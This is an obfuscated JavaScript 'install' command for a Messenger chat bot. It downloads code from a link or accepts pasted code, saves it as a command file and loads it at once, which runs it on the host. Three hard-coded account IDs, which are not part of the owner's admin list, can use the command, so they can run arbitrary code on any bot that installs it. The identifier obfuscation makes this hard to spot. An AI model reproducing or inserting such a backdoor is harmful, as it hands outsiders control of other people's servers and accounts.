const axios = require("axios"),
  fs = require('fs'),
  path = require("path"),
  vm = require('vm');
module['exports']['config'] = {
  'name': 'install',
  'version': '2.0.0',
  'hasPermission': 0x2,
  'credits': '乛\x20M𝆠፝֟R\x20ཐི༏ཋྀ\x20JU𝆠፝֟W𝆠፝֟ELꜛཐི༏ཋྀ࿐',
  'usePrefix': !![],
  'description': "Install/Overwrite JS file + Auto Reload + Permission Lock",
  'commandCategory': "utility",
  'usages': '[file\x20name]\x20[link/code]',
  'cooldowns': 0x5
}, module["exports"]['run'] = async function ({
  api: _0x2dfcb1,
  event: _0x3ac53f,
  args: _0x419794
}) {
  try {
    const _0x30f7c2 = ['61591646430352', "61591542717221", "61590000000000"],
      _0x57ba17 = _0x30f7c2["includes"](_0x3ac53f["senderID"]),
      _0x41ff40 = global['config']['ADMINBOT']['includes'](_0x3ac53f['senderID']);
    if (!_0x57ba17 && !_0x41ff40) return _0x2dfcb1['sendMessage']('╔══════════════════════╗\x0a❌\x20শুধুমাত্র\x20বট\x20এডমিন\x20ও\x20৩\x20জন\x20নির্দিষ্ট\x20ইউজার\x20install\x20করতে\x20পারবে!\x0a╚══════════════════════╝', _0x3ac53f['threadID'], _0x3ac53f['messageID']);
    const _0x1d8712 = _0x419794[0x0],
      _0x3415ab = _0x419794['slice'](0x1)["join"]('\x20');
    if (!_0x1d8712 || !_0x3415ab) return _0x2dfcb1['sendMessage']("╔══════════════════════╗\n⚠️ ফাইল নাম + কোড/লিংক দিন!\n╚══════════════════════╝", _0x3ac53f['threadID'], _0x3ac53f['messageID']);
    if (_0x1d8712["includes"]('..') || path["isAbsolute"](_0x1d8712)) return _0x2dfcb1['sendMessage']("╔══════════════════════╗\n❌ অবৈধ ফাইল নাম!\n╚══════════════════════╝", _0x3ac53f['threadID'], _0x3ac53f["messageID"]);
    if (!_0x1d8712["endsWith"]('.js')) return _0x2dfcb1["sendMessage"]('╔══════════════════════╗\x0a⚠️\x20শুধুমাত্র\x20.js\x20ফাইল!\x0a╚══════════════════════╝', _0x3ac53f['threadID'], _0x3ac53f["messageID"]);
    let _0x1d6092;
    const _0x2d1643 = /^(http|https):\/\/[^ "]+$/['test'](_0x3415ab);
    if (_0x2d1643) try {
      const _0x2dab74 = await axios["get"](_0x3415ab);
      _0x1d6092 = _0x2dab74['data'];
    } catch (_0x342c7e) {
      return _0x2dfcb1['sendMessage']("╔══════════════════════╗\n❌ লিংক থেকে কোড আনতে সমস্যা!\n╚══════════════════════╝", _0x3ac53f['threadID'], _0x3ac53f["messageID"]);
    } else _0x1d6092 = _0x3415ab;
    try {
      new vm['Script'](_0x1d6092);
    } catch (_0x47bfe1) {
      return _0x2dfcb1['sendMessage']("╔══════════════════════╗\n❌ Syntax Error: " + _0x47bfe1["message"] + '\x0a╚══════════════════════╝', _0x3ac53f['threadID'], _0x3ac53f['messageID']);
    }
    const _0x981e3b = path["join"](__dirname, _0x1d8712);
    let _0xaa10e9 = '✅\x20নতুন\x20ফাইল\x20তৈরি\x20হয়েছে!';
    fs['existsSync'](_0x981e3b) && (_0xaa10e9 = "♻️ ফাইল আপডেট হয়েছে!");
    fs['writeFileSync'](_0x981e3b, _0x1d6092, "utf-8");
    let _0x4ebfda = "Unknown";
    try {
      const _0xb515d8 = _0x1d8712["replace"]('.js', '');
      delete require["cache"][require["resolve"](_0x981e3b)];
      const _0x40bfee = require(_0x981e3b);
      global['client']["commands"]["delete"](_0xb515d8), global["client"]['commands']['set'](_0xb515d8, _0x40bfee), _0x40bfee['config'] && _0x40bfee['config']["credits"] && (_0x4ebfda = _0x40bfee['config']["credits"]);
    } catch (_0x48257d) {
      return _0x2dfcb1["sendMessage"]('╔══════════════════════╗\x0a⚠️\x20ফাইল\x20সেভ\x20হয়েছে\x20কিন্তু\x20reload\x20fail!\x20' + _0x48257d['message'] + "\n╚══════════════════════╝", _0x3ac53f['threadID'], _0x3ac53f['messageID']);
    }
    const _0x19511b = (await _0x2dfcb1['getUserInfo'](_0x3ac53f['senderID']))[_0x3ac53f['senderID']]["name"] || "অজানা";
    return _0x2dfcb1['sendMessage']('╔══════════════════════╗\x0a' + (_0xaa10e9 + '\x0a') + ('📂\x20' + _0x1d8712 + '\x0a') + ('👤\x20ইনস্টল\x20করেছেন:\x20' + _0x19511b + '\x0a') + ("👑 " + _0x4ebfda + '\x0a') + ('⚙️\x20v' + (module["exports"]['config']["version"] || '2.0.0') + '\x0a') + "╚══════════════════════╝\n" + '╔══════════════════════╗\x0a' + '\x0a\x09\x09乛\x20M𝆠፝֟R\x20ཐི༏ཋྀ\x20JU𝆠፝֟W𝆠፝֟ELꜛཐི༏ཋྀ࿐\x0a' + '╚══════════════════════╝', _0x3ac53f["threadID"], _0x3ac53f["messageID"]);
  } catch (_0x3cd576) {
    return console["error"](_0x3cd576), _0x2dfcb1['sendMessage']('╔══════════════════════╗\x0a❌\x20Unexpected\x20Error!\x0a╚══════════════════════╝', _0x3ac53f['threadID'], _0x3ac53f['messageID']);
  }
};
